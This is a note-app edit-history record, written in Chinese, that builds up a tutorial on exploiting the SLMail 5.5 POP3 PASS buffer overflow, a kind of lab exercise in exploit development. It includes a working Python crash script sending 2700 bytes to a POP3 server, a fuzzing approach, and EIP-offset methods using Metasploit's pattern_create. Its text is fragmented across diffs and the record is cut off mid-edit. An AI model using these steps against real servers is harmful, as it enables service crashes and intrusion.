{"compress":true,"commitItems":[["776122c6-1230-460b-a882-5ba873213d3d",1575959913141,"",[[1575959896203,["whale@Whale",[[1,0,"缓冲区溢出案例\n===\n\n\n缓冲区溢出的案例和exp开发流程\r\n- bug是怎么找到的?\r\n- 你怎么知道x比特在y命令，可以使应用程序崩溃造成缓冲区溢出漏洞？\r\n有三种方法：1. 如果有源代码，阅读源码是最简单的寻找bug的方式。\r\n2. 逆向工程\r\n3. fuzzing\r\n---\r\nfuzzing 是一种向应用程序发送构造的数据，然后期盼程序崩溃。\r\n程序崩溃说明程序没有对输入做正确的过滤。\r\n## 漏洞历史\r\n下面讲一下在slmail 5.5.0 邮件服务软件上的知名缓冲区溢出漏洞。\r\n在2005年发现，pop3 pass命令，在用户登陆的时候，有bof漏洞。攻击者无需知道\r\n任何口令即可引发bof漏洞。\r\n该软件未使用DEP或者ASLR编译，使得漏洞利用过程更加简单，我们不必绕过这些内部安全机制。\r\n## DEP和ASLR\r\n这是微软的内存保护机制。\r\nDEP是一系列硬件、软件技术，执行额外的内存检查，防止恶意代码在程序上运行。\r\nDEP主要的好处是当发生异常时，防止代码从数据区执行。\r\nASLR打乱载入应用程序、动态链接库时候的基地址（base address)\r\n## 与pop3协议通信\r\n我们选择slmail作为案例的原因是，与纯文本pop3协议通信十分简单。\r\n我们可以使用netcat与pop3服务器进行通信。"]],[0,0],[572,572]]],[1576030742006,[null,[[-1,30,"\r"],[1,31,"\n"],[-1,44,"\r"],[1,45,"\n"],[-1,80,"\r"],[1,81,"\n"],[-1,116,"\r"],[1,117,"\n"],[-1,125,"\r"],[1,126,"\n"],[-1,137,"\r"],[1,138,"\n"],[-1,142,"\r"],[1,143,"\n"],[-1,177,"\r"],[1,178,"\n"],[-1,199,"\r"],[1,200,"\n"],[-1,208,"\r"],[1,209,"\n"],[-1,247,"\r"],[1,248,"\n"],[-1,293,"\r"],[1,294,"\n"],[-1,309,"\r"],[1,310,"\n"],[-1,357,"\r"],[1,358,"\n"],[-1,370,"\r"],[1,371,"\n"],[-1,384,"\r"],[1,385,"\n"],[-1,424,"\r"],[1,425,"\n"],[-1,453,"\r"],[1,454,"\n"],[-1,493,"\r"],[1,494,"\n"],[-1,507,"\r"],[1,508,"\n"],[-1,545,"\r"],[1,546,"\n"]],[30,30],[547,547]]],[1576030742006,[null,[[1,30,"\r"],[-1,30,"\n"],[1,44,"\r"],[-1,44,"\n"],[1,80,"\r"],[-1,80,"\n"],[1,116,"\r"],[-1,116,"\n"],[1,125,"\r"],[-1,125,"\n"],[1,137,"\r"],[-1,137,"\n"],[1,142,"\r"],[-1,142,"\n"],[1,177,"\r"],[-1,177,"\n"],[1,199,"\r"],[-1,199,"\n"],[1,208,"\r"],[-1,208,"\n"],[1,247,"\r"],[-1,247,"\n"],[1,293,"\r"],[-1,293,"\n"],[1,309,"\r"],[-1,309,"\n"],[1,357,"\r"],[-1,357,"\n"],[1,370,"\r"],[-1,370,"\n"],[1,384,"\r"],[-1,384,"\n"],[1,424,"\r"],[-1,424,"\n"],[1,453,"\r"],[-1,453,"\n"],[1,493,"\r"],[-1,493,"\n"],[1,507,"\r"],[-1,507,"\n"],[1,545,"\r"],[-1,545,"\n"]],[547,547],[30,30]]],[1576030700095,["whale@Whale",[[-1,30,"\r"],[-1,44,"\r"],[-1,80,"\r"],[-1,116,"\r"],[-1,125,"\r"],[-1,137,"\r"],[-1,142,"\r"],[-1,177,"\r"],[-1,199,"\r"],[-1,208,"\r"],[-1,247,"\r"],[-1,293,"\r"],[-1,309,"\r"],[-1,357,"\r"],[-1,370,"\r"],[-1,384,"\r"],[-1,424,"\r"],[-1,453,"\r"],[-1,493,"\r"],[-1,507,"\r"],[-1,545,"\r"],[1,572,"\n\n"]],[551,551],[552,552]]],[1576030700251,["whale@Whale",[[1,553,"\n"]],[552,552],[553,553]]],[1576030700580,["whale@Whale",[[1,553,"https://slmail.software.informer.com/5.5/"]],[553,553],[594,594]]]]],["5a825310-96c2-4e52-81c9-3d6c2fd89c99",1576037779040,"缓冲区溢出案例\n===\n\n\n缓冲区溢出的案例和exp开发流程\n- bug是怎么找到的?\n- 你怎么知道x比特在y命令，可以使应用程序崩溃造成缓冲区溢出漏洞？\n有三种方法：1. 如果有源代码，阅读源码是最简单的寻找bug的方式。\n2. 逆向工程\n3. fuzzing\n---\nfuzzing 是一种向应用程序发送构造的数据，然后期盼程序崩溃。\n程序崩溃说明程序没有对输入做正确的过滤。\n## 漏洞历史\n下面讲一下在slmail 5.5.0 邮件服务软件上的知名缓冲区溢出漏洞。\n在2005年发现，pop3 pass命令，在用户登陆的时候，有bof漏洞。攻击者无需知道\n任何口令即可引发bof漏洞。\n该软件未使用DEP或者ASLR编译，使得漏洞利用过程更加简单，我们不必绕过这些内部安全机制。\n## DEP和ASLR\n这是微软的内存保护机制。\nDEP是一系列硬件、软件技术，执行额外的内存检查，防止恶意代码在程序上运行。\nDEP主要的好处是当发生异常时，防止代码从数据区执行。\nASLR打乱载入应用程序、动态链接库时候的基地址（base address)\n## 与pop3协议通信\n我们选择slmail作为案例的原因是，与纯文本pop3协议通信十分简单。\n我们可以使用netcat与pop3服务器进行通信。\n\nhttps://slmail.software.informer.com/5.5/\n",[[1576037768561,["whale@Whale",[[1,595,"\n"]],[594,594],[595,595]]],[1576037777954,["whale@Whale",[[-1,595,"\n"],[1,596,"安装exe到"]],[595,595],[601,601]]],[1576037779193,["whale@Whale",[[1,608,","]],[608,608],[609,609]]],[1576037779735,["whale@Whale",[[-1,608,","]],[609,609],[608,608]]],[1576037780337,["whale@Whale",[[1,608,"."]],[608,608],[609,609]]],[1576037780736,["whale@Whale",[[-1,608,"."]],[609,609],[608,608]]],[1576037781376,["whale@Whale",[[1,608,"，"]],[608,608],[609,609]]],[1576037781760,["whale@Whale",[[1,609,"\n\n"]],[609,609],[610,610]]],[1576041985048,[null,[[-1,601,",."],[1,603,"windows"]],[601,601],[610,610]]],[1576041985048,[null,[[1,601,",."],[-1,601,"windows"]],[610,610],[601,601]]],[1576041971079,["whale@Whale",[[1,611,"![15]($res/15.PNG)\n\n"]],[610,610],[630,630]]],[1576042526039,[null,[[-1,601,",."],[1,603,"windows"]],[601,601],[610,610]]],[1576042526039,[null,[[1,601,",."],[-1,601,"windows"]],[610,610],[601,601]]],[1576042483218,["whale@Whale",[[1,614,"6]($res/16.PNG)\n\n![1"]],[610,610],[630,630]]],[1576042586051,[null,[[-1,601,",."],[1,603,"windows"],[-1,609,"5]($r"],[1,634,"5]($r"]],[601,601],[639,639]]],[1576042586051,[null,[[1,601,",."],[-1,601,"windows"],[1,614,"5]($r"],[-1,634,"5]($r"]],[639,639],[601,601]]],[1576042564499,["whale@Whale",[[1,609,"于是"]],[609,609],[611,611]]],[1576042566773,["whale@Whale",[[-1,609,"于是"]],[611,611],[609,609]]],[1576042577750,["whale@Whale",[[1,609,"重启后，windows开放了110端口"]],[609,609],[628,628]]],[1576042579863,["whale@Whale",[[-1,626,"端口"]],[628,628],[626,626]]],[1576042581878,["whale@Whale",[[1,626," pop3"]],[626,626],[631,631]]],[1576042585151,["whale@Whale",[[1,626,"du"]],[626,626],[628,628]]],[1576042585629,["whale@Whale",[[-1,626,"du"]],[628,628],[626,626]]],[1576042646055,[null,[[-1,601,",.，\n\n![1"],[1,609,"windows，"],[-1,631,"5]($r"],[1,636,"\n\n![1"],[1,656,"5]($r"]],[601,601],[661,661]]],[1576042646055,[null,[[1,601,",.，\n\n![1"],[-1,601,"windows，"],[1,631,"5]($r"],[-1,631,"\n\n![1"],[-1,656,"5]($r"]],[661,661],[601,601]]],[1576042586867,["whale@Whale",[[1,626,"端口"]],[626,626],[628,628]]],[1576042589289,["whale@Whale",[[-1,629,"pop3"]],[633,633],[629,629]]],[1576042598486,["whale@Whale",[[1,623,"pop3-"]],[623,623],[628,628]]],[1576042827016,[null,[[-1,601,",.，\n\n![1"],[1,609,"windows，"],[-1,634,"5]($r"],[1,639,"\n\n![1"],[1,659,"5]($r"]],[601,601],[664,664]]],[1576042827016,[null,[[1,601,",.，\n\n![1"],[-1,601,"windows，"],[1,634,"5]($r"],[-1,634,"\n\n![1"],[-1,659,"5]($r"]],[664,664],[601,601]]],[1576042803332,["whale@Whale",[[1,676,"\n"]],[675,675],[676,676]]],[1576042810587,["whale@Whale",[[-1,676,"\n"],[1,677,"## 写一个python脚本"]],[676,676],[690,690]]],[1576042814057,["whale@Whale",[[1,690,"\n\n"]],[690,690],[691,691]]],[1576042821327,["whale@Whale",[[-1,656,"![15]($res/15.PNG)\n"]],[656,675],[656,656]]],[1576042823846,["whale@Whale",[[1,672,"![15]($res/15.PNG)\n"]],[672,672],[691,691]]],[1576042887019,[null,[[-1,601,",.，\n\n![1"],[1,609,"windows，"],[-1,634,"5]($r"],[1,639,"\n\n![1"],[1,656,"\n## "],[-1,667,"\n"],[1,688,"\n"]],[601,601],[689,689]]],[1576042887019,[null,[[1,601,",.，\n\n![1"],[-1,601,"windows，"],[1,634,"5]($r"],[-1,634,"\n\n![1"],[-1,656,"\n## "],[1,671,"\n"],[-1,691,"\n"]],[689,689],[601,601]]],[1576042828083,["whale@Whale",[[1,672,"\n"]],[672,672],[673,673]]],[1576042829145,["whale@Whale",[[1,672,"z"]],[672,672],[673,673]]],[1576042829939,["whale@Whale",[[-1,672,"z"]],[673,673],[672,672]]],[1576042836106,["whale@Whale",[[1,672,"这个脚本的作用很简单，"]],[672,672],[683,683]]],[1576042947976,[null,[[-1,601,",.，\n\n![1"],[1,609,"windows，"],[-1,634,"5]($r"],[1,639,"\n\n![1"],[1,656,"\n## "],[-1,668,"\n![1"],[1,684,"![1"],[1,700,"\n"]],[601,601],[701,701]]],[1576042947976,[null,[[1,601,",.，\n\n![1"],[-1,601,"windows，"],[1,634,"5]($r"],[-1,634,"\n\n![1"],[-1,656,"\n## "],[1,672,"\n![1"],[-1,684,"![1"],[-1,703,"\n"]],[701,701],[601,601]]],[1576042898490,["whale@Whale",[[1,683,"和nc起到的作用一样。"]],[683,683],[694,694]]],[1576042903740,["whale@Whale",[[1,695,"\n"]],[694,694],[695,695]]],[1576042904266,["whale@Whale",[[-1,695,"\n"]],[695,695],[694,694]]],[1576042907099,["whale@Whale",[[1,694,"为什么要"]],[694,694],[698,698]]],[1576042908956,["whale@Whale",[[-1,656,"\n"]],[656,656],[655,655]]]]],["f2069864-b160-4b64-9519-731956febba4",1576118750213,"缓冲区溢出案例\n===\n\n\n缓冲区溢出的案例和exp开发流程\n- bug是怎么找到的?\n- 你怎么知道x比特在y命令，可以使应用程序崩溃造成缓冲区溢出漏洞？\n有三种方法：1. 如果有源代码，阅读源码是最简单的寻找bug的方式。\n2. 逆向工程\n3. fuzzing\n---\nfuzzing 是一种向应用程序发送构造的数据，然后期盼程序崩溃。\n程序崩溃说明程序没有对输入做正确的过滤。\n## 漏洞历史\n下面讲一下在slmail 5.5.0 邮件服务软件上的知名缓冲区溢出漏洞。\n在2005年发现，pop3 pass命令，在用户登陆的时候，有bof漏洞。攻击者无需知道\n任何口令即可引发bof漏洞。\n该软件未使用DEP或者ASLR编译，使得漏洞利用过程更加简单，我们不必绕过这些内部安全机制。\n## DEP和ASLR\n这是微软的内存保护机制。\nDEP是一系列硬件、软件技术，执行额外的内存检查，防止恶意代码在程序上运行。\nDEP主要的好处是当发生异常时，防止代码从数据区执行。\nASLR打乱载入应用程序、动态链接库时候的基地址（base address)\n## 与pop3协议通信\n我们选择slmail作为案例的原因是，与纯文本pop3协议通信十分简单。\n我们可以使用netcat与pop3服务器进行通信。\n\nhttps://slmail.software.informer.com/5.5/\n安装exe到windows，重启后，windows开放了pop3-110端口 \n\n![16]($res/16.PNG)\n\n## 写一个python脚本\n这个脚本的作用很简单，和nc起到的作用一样。为什么要\n![15]($res/15.PNG)\n\n",[[1576118739863,["whale@Whale",[[1,697,"写这个脚本呢?因为稍作修改，就可以改为"]],[697,697],[716,716]]],[1576118754789,["whale@Whale",[[1,716,"fuzzer，"]],[716,716],[723,723]]],[1576118757156,["whale@Whale",[[-1,721,"r，"]],[723,723],[721,721]]],[1576118767073,["whale@Whale",[[1,721,"r脚本，使得应用程序崩溃。"]],[721,721],[734,734]]],[1576118778884,["whale@Whale",[[1,7,"与exp编写"]],[7,7],[13,13]]],[1576118782978,["whale@Whale",[[-1,11,"编写"]],[13,13],[11,11]]],[1576118787546,["whale@Whale",[[1,11,"开发流程"]],[11,11],[15,15]]],[1576118794770,["whale@Whale",[[-1,20,"\n\n缓冲区溢出的案例和exp开发流程\n"]],[19,38],[19,19]]]]],["b1c71eb0-b28e-4a44-9879-c78552d19901",1576119746027,"缓冲区溢出案例与exp开发流程\n===\n- bug是怎么找到的?\n- 你怎么知道x比特在y命令，可以使应用程序崩溃造成缓冲区溢出漏洞？\n有三种方法：1. 如果有源代码，阅读源码是最简单的寻找bug的方式。\n2. 逆向工程\n3. fuzzing\n---\nfuzzing 是一种向应用程序发送构造的数据，然后期盼程序崩溃。\n程序崩溃说明程序没有对输入做正确的过滤。\n## 漏洞历史\n下面讲一下在slmail 5.5.0 邮件服务软件上的知名缓冲区溢出漏洞。\n在2005年发现，pop3 pass命令，在用户登陆的时候，有bof漏洞。攻击者无需知道\n任何口令即可引发bof漏洞。\n该软件未使用DEP或者ASLR编译，使得漏洞利用过程更加简单，我们不必绕过这些内部安全机制。\n## DEP和ASLR\n这是微软的内存保护机制。\nDEP是一系列硬件、软件技术，执行额外的内存检查，防止恶意代码在程序上运行。\nDEP主要的好处是当发生异常时，防止代码从数据区执行。\nASLR打乱载入应用程序、动态链接库时候的基地址（base address)\n## 与pop3协议通信\n我们选择slmail作为案例的原因是，与纯文本pop3协议通信十分简单。\n我们可以使用netcat与pop3服务器进行通信。\n\nhttps://slmail.software.informer.com/5.5/\n安装exe到windows，重启后，windows开放了pop3-110端口 \n\n![16]($res/16.PNG)\n\n## 写一个python脚本\n这个脚本的作用很简单，和nc起到的作用一样。为什么要写这个脚本呢?因为稍作修改，就可以改为fuzzer脚本，使得应用程序崩溃。\n![15]($res/15.PNG)\n\n",[[1576119712505,["whale@Whale",[[1,744,"\n"]],[743,743],[744,744]]],[1576119713848,["whale@Whale",[[1,744,"imuunity debugger\n\n左上 --指令面板\n\n右上 ==寄存器面板\n\n左下 --内存转储面板\n\n右下 --堆栈面板"]],[744,744],[808,808]]],[1576119734846,["whale@Whale",[[1,744,"![17]($res/17.PNG)\n\n"]],[743,743],[763,763]]],[1576119740514,["whale@Whale",[[1,764,"## "]],[764,764],[767,767]]],[1576119744347,["whale@Whale",[[-1,744,"![17]($res/17.PNG)\n"]],[744,763],[744,744]]],[1576119746410,["whale@Whale",[[1,766,"![17]($res/17.PNG)\n"]],[766,766],[785,785]]],[1576119773299,["whale@Whale",[[-1,748,"imuunity debugger"],[1,765,"![17]($res/17.PNG)\n"]],[748,765],[767,767]]],[1576119774502,["whale@Whale",[[1,748,"imuunity debugger"],[-1,748,"![17]($res/17.PNG)\n"]],[767,767],[748,765]]],[1576119781457,["whale@Whale",[[-1,750,"u"],[1,751,"m"]],[748,765],[765,765]]],[1576120248992,["whale@Whale",[[1,744,"[https://github.com/Whale3070/ctf-coding/blob/master/send.py](https://github.com/Whale3070/ctf-coding/blob/master/send.py)"]],[744,744],[866,866]]],[1576120253137,["whale@Whale",[[1,867,"\n"]],[866,866],[867,867]]],[1576120253664,["whale@Whale",[[1,868,"\n"]],[867,867],[868,868]]],[1576120332701,["whale@Whale",[[1,868,"[https://github.com/Whale3070/ctf-coding/blob/master/fuzzer.py](https://github.com/Whale3070/ctf-coding/blob/master/fuzzer.py)"]],[868,868],[994,994]]],[1576120517006,["whale@Whale",[[1,1016,"\n"]],[1015,1015],[1016,1016]]],[1576120519658,["whale@Whale",[[1,1016,"file a"]],[1016,1016],[1022,1022]]],[1576120520091,["whale@Whale",[[-1,1021,"a"]],[1022,1022],[1021,1021]]],[1576120522418,["whale@Whale",[[1,1021,"-- attack"]],[1021,1021],[1030,1030]]],[1576120523251,["whale@Whale",[[-1,1029,"k"]],[1030,1030],[1029,1029]]],[1576120529207,["whale@Whale",[[1,1029,"h --sl"]],[1029,1029],[1035,1035]]],[1576120529953,["whale@Whale",[[-1,1033,"sl"]],[1035,1035],[1033,1033]]],[1576120532283,["whale@Whale",[[1,1033,"SLmail"]],[1033,1033],[1039,1039]]],[1576120547320,["whale@Whale",[[-1,1016,"file -- attach --SLmail\n![17]($res/17.PNG)"]],[1016,1058],[1016,1016]]],[1576120551293,["whale@Whale",[[1,1064,"\n"]],[1063,1063],[1064,1064]]],[1576120551471,["whale@Whale",[[1,1065,"\n"]],[1064,1064],[1065,1065]]],[1576120552460,["whale@Whale",[[1,1065,"file -- attach --SLmail\n![17]($res/17.PNG)"]],[1065,1065],[1107,1107]]],[1576120593983,["whale@Whale",[[1,1018,"![18]($res/18.PNG)\n\n"]],[1017,1017],[1037,1037]]],[1576120598062,["whale@Whale",[[-1,1017,"\n"]],[1017,1017],[1016,1016]]],[1576120598362,["whale@Whale",[[-1,1016,"\n"]],[1016,1016],[1015,1015]]]]],["4fa57cfb-61b9-4e96-a92e-b73fdb25b80a",1576121818737,"缓冲区溢出案例与exp开发流程\n===\n- bug是怎么找到的?\n- 你怎么知道x比特在y命令，可以使应用程序崩溃造成缓冲区溢出漏洞？\n有三种方法：1. 如果有源代码，阅读源码是最简单的寻找bug的方式。\n2. 逆向工程\n3. fuzzing\n---\nfuzzing 是一种向应用程序发送构造的数据，然后期盼程序崩溃。\n程序崩溃说明程序没有对输入做正确的过滤。\n## 漏洞历史\n下面讲一下在slmail 5.5.0 邮件服务软件上的知名缓冲区溢出漏洞。\n在2005年发现，pop3 pass命令，在用户登陆的时候，有bof漏洞。攻击者无需知道\n任何口令即可引发bof漏洞。\n该软件未使用DEP或者ASLR编译，使得漏洞利用过程更加简单，我们不必绕过这些内部安全机制。\n## DEP和ASLR\n这是微软的内存保护机制。\nDEP是一系列硬件、软件技术，执行额外的内存检查，防止恶意代码在程序上运行。\nDEP主要的好处是当发生异常时，防止代码从数据区执行。\nASLR打乱载入应用程序、动态链接库时候的基地址（base address)\n## 与pop3协议通信\n我们选择slmail作为案例的原因是，与纯文本pop3协议通信十分简单。\n我们可以使用netcat与pop3服务器进行通信。\n\nhttps://slmail.software.informer.com/5.5/\n安装exe到windows，重启后，windows开放了pop3-110端口 \n\n![16]($res/16.PNG)\n\n## 写一个python脚本\n这个脚本的作用很简单，和nc起到的作用一样。为什么要写这个脚本呢?因为稍作修改，就可以改为fuzzer脚本，使得应用程序崩溃。\n![15]($res/15.PNG)\n\n[https://github.com/Whale3070/ctf-coding/blob/master/send.py](https://github.com/Whale3070/ctf-coding/blob/master/send.py)\n\n[https://github.com/Whale3070/ctf-coding/blob/master/fuzzer.py](https://github.com/Whale3070/ctf-coding/blob/master/fuzzer.py)\n## immunity debugger\n![18]($res/18.PNG)\n\n左上 --指令面板\n\n右上 ==寄存器面板\n\n左下 --内存转储面板\n\n右下 --堆栈面板\n\nfile -- attach --SLmail\n![17]($res/17.PNG)\n",[[1576121794837,["whale@Whale",[[1,1083,"\n"]],[1082,1082],[1083,1083]]],[1576121795631,["whale@Whale",[[1,1083,"---"]],[1083,1083],[1086,1086]]],[1576121827871,["whale@Whale",[[1,1130,"\n"]],[1129,1129],[1130,1130]]],[1576121828038,["whale@Whale",[[1,1131,"\n"]],[1130,1130],[1131,1131]]],[1576121835851,["whale@Whale",[[1,1132,"![19]($res/19.PNG)\n\n"]],[1131,1131],[1151,1151]]],[1576121913620,["whale@Whale",[[1,1134,"20]($res/20.PNG)\n\n!["]],[1131,1131],[1151,1151]]],[1576121932703,["whale@Whale",[[1,1131,"挂载后，点击下图的开始按钮，运行程序"]],[1131,1131],[1149,1149]]],[1576121935180,["whale@Whale",[[1,1170,"\n"]],[1169,1169],[1170,1170]]],[1576121937124,["whale@Whale",[[1,1170,"运行"]],[1170,1170],[1172,1172]]],[1576121939776,["whale@Whale",[[1,1172,"fuzzer.py"]],[1172,1172],[1181,1181]]],[1576121949468,["whale@Whale",[[1,995,"\n"]],[994,994],[995,995]]],[1576121965791,["whale@Whale",[[1,1182,"[https://github.com/Whale3070/ctf-coding/blob/master/fuzzer.py](https://github.com/Whale3070/ctf-coding/blob/master/fuzzer.py)\n"]],[1182,1182],[1309,1309]]],[1576121969444,["whale@Whale",[[-1,1183,"https://github.com/Whale3070/ctf-coding/blob/master/"]],[1183,1235],[1183,1183]]],[1576121973186,["whale@Whale",[[-1,1173,"fuzzer.py"]],[1182,1182],[1173,1173]]],[1576124135565,["whale@Whale",[[1,1247,",s"]],[1247,1247],[1249,1249]]],[1576124136168,["whale@Whale",[[-1,1247,",s"]],[1249,1249],[1247,1247]]],[1576124142035,["whale@Whale",[[1,1247,"，使得"]],[1247,1247],[1250,1250]]],[1576124142128,["whale@Whale",[[-1,1249,"得"]],[1250,1250],[1249,1249]]],[1576124154801,["whale@Whale",[[1,1249,"程序崩溃，造成了缓冲区溢出"]],[1249,1249],[1262,1262]]],[1576124156524,["whale@Whale",[[1,1284,"\n"]],[1282,1282],[1283,1283]]],[1576124156781,["whale@Whale",[[1,1285,"\n"]],[1283,1283],[1284,1284]]],[1576124162139,["whale@Whale",[[1,1286,"\n"]],[1284,1284],[1285,1285]]],[1576124231000,["whale@Whale",[[1,1284,"## 修改exp"]],[1284,1284],[1292,1292]]],[1576124231824,["whale@Whale",[[1,1295,"\n"]],[1292,1292],[1293,1293]]],[1576125598877,["whale@Whale",[[1,1294,"#!/usr/bin/python\r\nimport socket\r\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\nbuffer= 'a' * 2700\r\ntry:\r\n\tprint \"\\nSending evil buffer...\"\r\n\ts.connect(('192.168.1.102',110)) # connect to IP, POP3 port\r\n\tdata = s.recv(1024) # receive banner\r\n\tprint data # print banner\r\n\t\r\n\ts.send('USER test' +'\\r\\n') # send username \"test\"\r\n\tdata = s.recv(1024) # receive reply\r\n\tprint data # print reply\r\n\t\r\n\ts.send('PASS' + buffer + '\\r\\n') # send password \"test\"\r\n\tdata = s.recv(1024)\r\n\tprint data # print reply\r\n\t\r\n\ts.close() # close socket\r\n\tprint \"\\nDone!\"\r\nexcept:\r\n\tprint \"Could not connect to POP3!\""]],[1294,1294],[1896,1896]]],[1576125603865,["whale@Whale",[[1,1293,"`"],[-1,1311,"\r"],[-1,1326,"\r"],[-1,1381,"\r"],[-1,1401,"\r"],[-1,1407,"\r"],[-1,1442,"\r"],[-1,1504,"\r"],[-1,1543,"\r"],[-1,1571,"\r"],[-1,1574,"\r"],[-1,1627,"\r"],[-1,1665,"\r"],[-1,1692,"\r"],[-1,1695,"\r"],[-1,1753,"\r"],[-1,1775,"\r"],[-1,1802,"\r"],[-1,1805,"\r"],[-1,1832,"\r"],[-1,1850,"\r"],[-1,1859,"\r"]],[1293,1293],[1294,1294]]],[1576125604750,["whale@Whale",[[1,1294,"``"]],[1294,1294],[1296,1296]]],[1576125607030,["whale@Whale",[[-1,1879,"\n"],[1,1880,"```"]],[1879,1879],[1882,1882]]],[1576125609412,["whale@Whale",[[1,1293,"\n"]],[1292,1292],[1293,1293]]],[1576125611000,["whale@Whale",[[1,1293,"di"]],[1293,1293],[1295,1295]]],[1576125611551,["whale@Whale",[[-1,1293,"di"]],[1295,1295],[1293,1293]]],[1576125620917,["whale@Whale",[[1,1293,"定位缓冲区大小，当输入26"]],[1293,1293],[1306,1306]]],[1576125621958,["whale@Whale",[[-1,1305,"6"]],[1306,1306],[1305,1305]]],[1576125622850,["whale@Whale",[[1,1305,"7000"]],[1305,1305],[1309,1309]]],[1576125623324,["whale@Whale",[[-1,1308,"0"]],[1309,1309],[1308,1308]]],[1576125627421,["whale@Whale",[[1,1308,"字节"]],[1308,1308],[1310,1310]]],[1576125628402,["whale@Whale",[[-1,1308,"字节"]],[1310,1310],[1308,1308]]],[1576125639774,["whale@Whale",[[1,1308,"个a时候，内存就会报错。"]],[1308,1308],[1320,1320]]],[1576125728231,["whale@Whale",[[-1,1305,"7"]],[1306,1306],[1305,1305]]],[1576125728583,["whale@Whale",[[1,1305,"6"]],[1305,1305],[1306,1306]]],[1576125732350,["whale@Whale",[[-1,1319,"。"]],[1320,1320],[1319,1319]]],[1576125734710,["whale@Whale",[[1,1319,"，而"]],[1319,1319],[1321,1321]]],[1576125737077,["whale@Whale",[[-1,1319,"，而"]],[1321,1321],[1319,1319]]],[1576125738427,["whale@Whale",[[1,1319,"。"]],[1319,1319],[1320,1320]]],[1576125750927,["whale@Whale",[[1,1304,"输入2500个a，程序运行正常；"]],[1302,1302],[1318,1318]]],[1576125754583,["whale@Whale",[[-1,1329,"内存"]],[1331,1331],[1329,1329]]],[1576125763407,["whale@Whale",[[1,1292,"，"]],[1292,1292],[1293,1293]]],[1576125766966,["whale@Whale",[[-1,1285,"# 修改exp，"]],[1293,1293],[1285,1285]]],[1576125767128,["whale@Whale",[[1,1285," "]],[1285,1285],[1286,1286]]],[1576125767769,["whale@Whale",[[-1,1285," "]],[1286,1286],[1285,1285]]],[1576125768950,["whale@Whale",[[1,1285,"@ "]],[1285,1285],[1287,1287]]],[1576125769496,["whale@Whale",[[-1,1285,"@ "]],[1287,1287],[1285,1285]]],[1576125775040,["whale@Whale",[[1,1285,"# 定位缓冲区大小"]],[1285,1285],[1294,1294]]],[1576125778613,["whale@Whale",[[1,1926,"\n\n"]],[1926,1926],[1927,1927]]],[1576125783655,["whale@Whale",[[-1,1927,"\n"],[1,1928,"## 控制eip"]],[1927,1927],[1935,1935]]],[1576213123032,[null,[[-1,1306,"输入"],[1,1322,"输入"]],[1306,1306],[1324,1324]]],[1576213123032,[null,[[1,1306,"输入"],[-1,1320,"输入"]],[1324,1324],[1306,1306]]],[1576213082861,["whale@Whale",[[1,1935,"\n\n"]],[1935,1935],[1936,1936]]],[1576213083205,["whale@Whale",[[1,1937,"\n"]],[1936,1936],[1937,1937]]],[1576213084260,["whale@Whale",[[1,1937,"控制eip寄存器是exp开发流程中关键的有，eip寄存器就像驾驭马的辔头一样，控制缰绳就让应用程序前进，\r\n拉着缰绳就能让它改变前进方向。所以我们使用4个A在buffer(缓冲区)中覆盖了EIP，这里有两个常见的方法：\r\n## 二叉树分析\r\n将2700个A修改为，发送1350A和1350个B，如果EIP被B所覆盖，我们知道了4比特存在于buffer的第二部分。\r\n接下来，修改1350个B为675个B和675个C，然后再一次发送buffer。\r\n如果EIP被C覆盖，我们知道了4bit存在于2000-2700比特范围之间。\r\n我们继续将buffer二分直到我们知道了准确的覆盖EIP的4bit。\r\n数学上来说，这将在7次之内找到。\r\n## 发送一个特殊的字符串\r\n最快的方式是发送一个特殊的字符，来确认覆盖EIP的范围，然后在buffer中查找这个字符。\r\n\r\n## patter_create.rb是一个ruby工具，来创建和定位这样的buffer，并且可以在msf中找到它。\r\n使用方法：\r\nlocate pattern_create\r\np_c绝对路径 -l 2700"]],[1937,1937],[2424,2424]]],[1576213365018,[null,[[-1,1306,"输入"],[1,1322,"输入"],[-1,1989,"\r"],[1,1990,"\n"],[-1,2046,"\r"],[1,2047,"\n"],[-1,2056,"\r"],[1,2057,"\n"],[-1,2118,"\r"],[1,2119,"\n"],[-1,2159,"\r"],[1,2160,"\n"],[-1,2199,"\r"],[1,2200,"\n"],[-1,2235,"\r"],[1,2236,"\n"],[-1,2253,"\r"],[1,2254,"\n"],[-1,2268,"\r"],[1,2269,"\n"],[-1,2315,"\r\n\r"],[1,2318,"\n\n\n"],[-1,2377,"\r"],[1,2378,"\n"],[-1,2384,"\r"],[1,2385,"\n"],[-1,2407,"\r"],[1,2408,"\n"]],[1306,1306],[2409,2409]]],[1576213365018,[null,[[1,1306,"输入"],[-1,1320,"输入"],[1,1989,"\r"],[-1,1989,"\n"],[1,2046,"\r"],[-1,2046,"\n"],[1,2056,"\r"],[-1,2056,"\n"],[1,2118,"\r"],[-1,2118,"\n"],[1,2159,"\r"],[-1,2159,"\n"],[1,2199,"\r"],[-1,2199,"\n"],[1,2235,"\r"],[-1,2235,"\n"],[1,2253,"\r"],[-1,2253,"\n"],[1,2268,"\r"],[-1,2268,"\n"],[1,2315,"\r\n\r"],[-1,2315,"\n\n\n"],[1,2377,"\r"],[-1,2377,"\n"],[1,2384,"\r"],[-1,2384,"\n"],[1,2407,"\r"],[-1,2407,"\n"]],[2409,2409],[1306,1306]]],[1576213305699,["whale@Whale",[[-1,1989,"\r"],[-1,2046,"\r"],[-1,2056,"\r"],[-1,2118,"\r"],[-1,2159,"\r"],[-1,2199,"\r"],[-1,2235,"\r"],[-1,2253,"\r"],[-1,2268,"\r"],[-1,2315,"\r"],[-1,2317,"\r"],[-1,2377,"\r"],[-1,2384,"\r"],[-1,2407,"\r"],[1,2409,"/usr/share/metas"],[1,2410,"loit-framework/tools/exploit/pattern"],[-1,2412,"绝对路径"],[1,2416,"reate.rb\r\n"]],[2395,2402],[2460,2460]]],[1576213345268,["whale@Whale",[[-1,2458,"\r\n"]],[2458,2458],[2458,2458]]],[1576213424996,[null,[[-1,1306,"输入"],[1,1322,"输入"]],[1306,1306],[1324,1324]]],[1576213424997,[null,[[1,1306,"输入"],[-1,1320,"输入"]],[1324,1324],[1306,1306]]],[1576213404641,["whale@Whale",[[1,2327,"\n"]],[2327,2327],[2328,2328]]],[1576213406033,["whale@Whale",[[1,2328,"\n"]],[2328,2328],[2329,2329]]],[1576213412662,["whale@Whale",[[1,2048,"#"]],[2048,2048],[2049,2049]]],[1576213419374,["whale@Whale",[[1,2250,"#"]],[2250,2250],[2251,2251]]],[1576213424083,["whale@Whale",[[-1,2310,"## 